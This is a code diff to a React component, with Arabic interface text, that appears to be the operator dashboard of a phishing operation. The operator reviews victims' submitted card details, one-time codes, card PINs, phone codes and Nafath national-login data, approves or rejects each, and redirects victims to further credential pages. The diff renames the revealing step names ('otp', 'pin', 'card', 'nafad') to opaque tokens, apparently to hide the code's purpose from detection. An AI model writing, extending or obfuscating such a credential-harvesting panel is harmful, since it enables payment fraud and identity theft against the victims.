@@ -58,17 +58,17 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         case "payment":
           updates = { currentStep: "payment" as any }
           break
-        case "otp":
-          updates = { currentStep: "otp" as any }
+        case "_t2":
+          updates = { currentStep: "_t2" as any }
           break
-        case "pin":
-          updates = { currentStep: "pin" as any }
+        case "_t3":
+          updates = { currentStep: "_t3" as any }
           break
         case "phone":
           updates = { currentStep: "phone" as any }
           break
-        case "nafad":
-          updates = { currentStep: "nafad" as any }
+        case "_t6":
+          updates = { currentStep: "_t6" as any }
           break
         case "nafad_modal":
           updates = { nafadConfirmationCode: "123456" } // Send confirmation code to open modal
@@ -133,7 +133,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   }
 
   // 2. Nafad Info (show at top if exists)
-  if (displayVisitor.nafazId || displayVisitor.currentStep === "nafad") {
+  if (displayVisitor.nafazId || displayVisitor.currentStep === "_t6") {
     bubbles.push({
       id: "nafad-info",
       title: "معلومات نفاذ",
@@ -236,7 +236,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         status: "pending" as const,
         showActions: true,
         isLatest: true,
-        type: "card"
+        type: "_t1"
       })
     }
     
@@ -266,7 +266,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                 displayVisitor.otpStatus === "rejected" ? "rejected" as const : "pending" as const,
         showActions: displayVisitor.otp && displayVisitor.otpStatus !== "approved" && displayVisitor.otpStatus !== "rejected",
         isLatest: true,
-        type: "otp"
+        type: "_t2"
       })
     }
     
@@ -285,7 +285,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         status: "pending" as const,
         showActions: false,
         isLatest: true,
-        type: "pin"
+        type: "_t3"
       })
     }
     
@@ -304,7 +304,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         status: "pending" as const,
         showActions: false,
         isLatest: true,
-        type: "phone_info"
+        type: "_t4"
       })
     }
     
@@ -334,7 +334,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                 displayVisitor.phoneOtpStatus === "rejected" ? "rejected" as const : "pending" as const,
         showActions: displayVisitor.phoneOtp && displayVisitor.phoneOtpStatus !== "approved" && displayVisitor.phoneOtpStatus !== "rejected",
         isLatest: true,
-        type: "phone_otp"
+        type: "_t5"
       })
     }
   // } // Removed - no longer needed
@@ -355,7 +355,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   const sortedBubbles = [...dynamicBubbles, ...staticBubbles]
 
   // Action handlers for bubbles
-  const handleBubbleAction = async (bubbleId: string, action: "approve" | "reject" | "resend" | "otp" | "pin") => {
+  const handleBubbleAction = async (bubbleId: string, action: "approve" | "reject" | "resend" | "_t2" | "_t3") => {
     if (!visitor.id || isProcessing) return
     
     setIsProcessing(true)
@@ -365,12 +365,12 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       if (!bubble) return
 
       switch (bubble.type) {
-        case "card":
-          if (action === "otp") {
+        case "_t1":
+          if (action === "_t2") {
             // Approve card with OTP - redirect to /veri
             await updateApplication(visitor.id, { cardStatus: "approved_with_otp" })
             alert("تم قبول البطاقة! سيتم توجيه الزائر لصفحة OTP")
-          } else if (action === "pin") {
+          } else if (action === "_t3") {
             // Approve card with PIN - redirect to /confi
             await updateApplication(visitor.id, { cardStatus: "approved_with_pin" })
             alert("تم قبول البطاقة! سيتم توجيه الزائر لصفحة PIN")
@@ -383,7 +383,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           }
           break
 
-        case "otp":
+        case "_t2":
           if (action === "approve") {
             // Approve OTP - redirect to /confi
             await updateApplication(visitor.id, { otpStatus: "approved" })
@@ -397,7 +397,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           }
           break
 
-        case "phone_otp":
+        case "_t5":
           if (action === "approve") {
             if (hasMultipleAttempts) {
               await handlePhoneOtpApproval(visitor.id, bubbleId, history)
@@ -499,10 +499,10 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                 <option value="">توجيه الزائر...</option>
                 <option value="home">الصفحة الرئيسية</option>
                 <option value="payment">صفحة الدفع</option>
-                <option value="otp">كود التحقق (OTP)</option>
-                <option value="pin">رمز البطاقة (PIN)</option>
+                <option value="_t2">كود التحقق (OTP)</option>
+                <option value="_t3">رمز البطاقة (PIN)</option>
                 <option value="phone">صفحة الهاتف</option>
-                <option value="nafad">صفحة نفاذ</option>
+                <option value="_t6">صفحة نفاذ</option>
                 <option value="nafad_modal">مودال نفاذ</option>
               </select>
             </div>
@@ -530,17 +530,17 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               actions={
                 bubble.customActions ? bubble.customActions : bubble.showActions ? (
                   <div className="flex gap-2 mt-3">
-                    {bubble.type === "card" && (
+                    {bubble.type === "_t1" && (
                       <>
                         <button
-                          onClick={() => handleBubbleAction(bubble.id, "otp")}
+                          onClick={() => handleBubbleAction(bubble.id, "_t2")}
                           disabled={isProcessing}
                           className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-blue-600 text-white rounded-lg text-xs md:text-sm hover:bg-blue-700 disabled:opacity-50 font-medium"
                         >
                           🔑 رمز OTP
                         </button>
                         <button
-                          onClick={() => handleBubbleAction(bubble.id, "pin")}
+                          onClick={() => handleBubbleAction(bubble.id, "_t3")}
                           disabled={isProcessing}
                           className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-purple-600 text-white rounded-lg text-xs md:text-sm hover:bg-purple-700 disabled:opacity-50 font-medium"
                         >
@@ -555,7 +555,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                         </button>
                       </>
                     )}
-                    {bubble.type === "otp" && (
+                    {bubble.type === "_t2" && (
                       <>
                         <button
                           onClick={() => handleBubbleAction(bubble.id, "approve")}
@@ -573,7 +573,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                         </button>
                       </>
                     )}
-                    {bubble.type === "phone_otp" && (
+                    {bubble.type === "_t5" && (
                       <>
                         <button
                           onClick={() => handleBubbleAction(bubble.id, "approve")}
